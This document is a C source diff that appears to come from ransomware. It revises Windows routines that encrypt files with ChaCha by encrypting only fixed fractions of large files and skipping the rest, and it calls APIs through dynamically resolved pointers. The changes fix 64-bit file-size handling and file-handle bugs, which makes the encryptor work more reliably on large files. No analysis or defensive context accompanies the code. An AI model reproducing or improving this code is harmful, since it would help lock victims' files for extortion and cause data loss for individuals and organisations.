@@ -294,9 +294,15 @@ int chachaLargeFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, con
 	if (!TempGetTempPathA) {
 		populateAPICrypto();
 	}
-	DWORD fileSize = TempGetFileSize(hFileIn, NULL);
-	DWORD dwEncryptBlockSize = ((1500.0 / 9240.0) * fileSize) / 3.0;
-	DWORD dwSkipLength = (fileSize - 3 * dwEncryptBlockSize) / 2;
+	DWORD fileSizeHigh = 0;
+	DWORD fileSize = TempGetFileSize(hFileIn, &fileSizeHigh);
+	long long realFileSize = ((long long)fileSizeHigh << 32) | fileSize;
+
+	long long llEncryptBlockSize = ((1500.0 / 9240.0) * realFileSize) / 3.0;
+	long long llSkipLength = (realFileSize - 3 * llEncryptBlockSize) / 2;
+
+	DWORD dwEncryptBlockSize = (DWORD)llEncryptBlockSize;
+	DWORD dwSkipLength = (DWORD)llSkipLength;
 
 	CHACHA_CONTEXT context;
 	DWORD byteRead;
@@ -319,6 +325,7 @@ int chachaLargeFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, con
 				if (TempWriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
 					return -1;
 				}
+				totalReadBlock += byteRead;
 				if (byteRead < CHACHA_BLOCKLENGTH * 1024) {
 					break;
 				}
@@ -341,7 +348,6 @@ int chachaLargeFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, con
 
 			DWORD temp = 0;
 			DWORD maxRead = (totalReadBlock + CHACHA_BLOCKLENGTH * 1024 - dwEncryptBlockSize) + dwSkipLength;
-
 			BYTE* tempBuffer = (BYTE*)calloc(maxRead, 1);
 
 			if (TempReadFile(hFileIn, tempBuffer, maxRead, &byteRead, NULL) == FALSE) {
@@ -490,19 +496,19 @@ int fileEncrypt(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPCSTR oriFileName, 
 	else {
 		sizeFlag = 0;
 	}
+
+	outFile = TempCreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
 	if (outFile == INVALID_HANDLE_VALUE) {
 		goto CLEANUP;
 	}
 	if (sizeFlag == 0) {
-		outFile = TempCreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 		chachaFileEncrypt(inFile, outFile, key, nonce);
 	}
 	else if (sizeFlag == 1) {
-		outFile = TempCreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 		chachaMediumFileEncrypt(inFile, outFile, key, nonce);
 	}
 	else {
-		outFile = TempCreateFileA(newFileName, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 		chachaLargeFileEncrypt(inFile, outFile, key, nonce);
 	}
 
